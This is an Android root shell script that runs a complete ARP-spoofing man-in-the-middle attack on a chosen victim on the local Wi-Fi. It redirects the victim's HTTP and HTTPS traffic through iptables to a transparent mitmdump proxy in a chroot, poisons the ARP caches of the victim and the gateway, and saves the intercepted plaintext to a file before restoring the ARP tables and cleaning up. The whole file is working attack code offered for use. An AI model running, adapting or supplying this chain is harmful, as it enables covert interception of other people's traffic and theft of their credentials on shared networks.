#!/system/bin/sh
# Full ARP MITM + HTTPS decryption attack chain (run on host root)
# Usage: run_attack.sh <victim_ip> <victim_mac> <gateway_ip> <gateway_mac> <attacker_mac> [window_sec]
# Automatic: enable forwarding -> iptables REDIRECT -> start mitmdump via chroot -> ARP poisoning -> sleep -> restore -> cleanup
# Plaintext lands in workspace/mitm_plain.txt (inside chroot, /workspace is this workspace)
set -e

victim_ip="$1"; victim_mac="$2"; gateway_ip="$3"; gateway_mac="$4"; attacker_mac="$5"
window="${6:-60}"
iface="wlan0"

if [ -z "$victim_ip" ] || [ -z "$victim_mac" ] || [ -z "$gateway_ip" ] || [ -z "$gateway_mac" ] || [ -z "$attacker_mac" ]; then
  echo "usage: $0 <victim_ip> <victim_mac> <gateway_ip> <gateway_mac> <attacker_mac> [window_sec]" >&2
  exit 2
fi

WS=$(pwd)
SESSION=$(dirname "$WS")
SESSION_HOME="$SESSION/home"
ROOTFS="/data/data/ai.capri.app/files/runtime/ubuntu"
ARP_TOOL="$WS/arp_tool"

[ -x "$ARP_TOOL" ] || { echo "missing $ARP_TOOL, run compile_arp_tool.sh first" >&2; exit 2; }

# 1. Enable forwarding + iptables redirect
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -s "$victim_ip" -p tcp --dport 443 -j REDIRECT --to-ports 8080
iptables -t nat -A PREROUTING -s "$victim_ip" -p tcp --dport 80 -j REDIRECT --to-ports 8080

# 2. chroot mount (idempotent) + start mitmdump
umount "$ROOTFS/root" 2>/dev/null || true
umount "$ROOTFS/workspace" 2>/dev/null || true
umount "$ROOTFS/dev" 2>/dev/null || true
umount "$ROOTFS/proc" 2>/dev/null || true
mount --bind "$SESSION_HOME" "$ROOTFS/root"
mount --bind "$WS" "$ROOTFS/workspace"
mount --bind /dev "$ROOTFS/dev"
mount --bind /proc "$ROOTFS/proc"

chroot "$ROOTFS" /root/.venv/bin/mitmdump --mode transparent \
  --listen-host 0.0.0.0 --listen-port 8080 \
  --set confdir=/workspace/mitmconf \
  -s /workspace/mitm_dump.py \
  > /data/local/tmp/mitm.log 2>&1 &
mitm_pid=$!
echo "$mitm_pid" > /data/local/tmp/mitm.pid

sleep 2

# 3. ARP poisoning (background infinite loop, 300ms interval)
"$ARP_TOOL" "$iface" "$attacker_mac" "$victim_ip" "$victim_mac" "$gateway_ip" "$gateway_mac" poison 300 0 \
  > /data/local/tmp/arp.log 2>&1 &
arp_pid=$!
echo "$arp_pid" > /data/local/tmp/arp_tool.pid

echo "== window ${window}s started: victim=$victim_ip gw=$gateway_ip =="
sleep "$window"

# 4. Restore ARP (explicit count=3 to avoid an infinite loop)
kill "$arp_pid" 2>/dev/null || true
"$ARP_TOOL" "$iface" "$attacker_mac" "$victim_ip" "$victim_mac" "$gateway_ip" "$gateway_mac" restore 100 3 > /dev/null 2>&1 || true

# 5. Cleanup
kill "$mitm_pid" 2>/dev/null || true
iptables -t nat -D PREROUTING -s "$victim_ip" -p tcp --dport 443 -j REDIRECT --to-ports 8080 2>/dev/null || true
iptables -t nat -D PREROUTING -s "$victim_ip" -p tcp --dport 80 -j REDIRECT --to-ports 8080 2>/dev/null || true
echo 0 > /proc/sys/net/ipv4/ip_forward

echo "== done =="
if [ -s "$WS/mitm_plain.txt" ]; then
  echo "plaintext captured: $(wc -l < "$WS/mitm_plain.txt") lines"
else
  echo "(no plaintext captured — see /data/local/tmp/mitm.log to tell whether the handshake was rejected or traffic was not redirected)"
fi
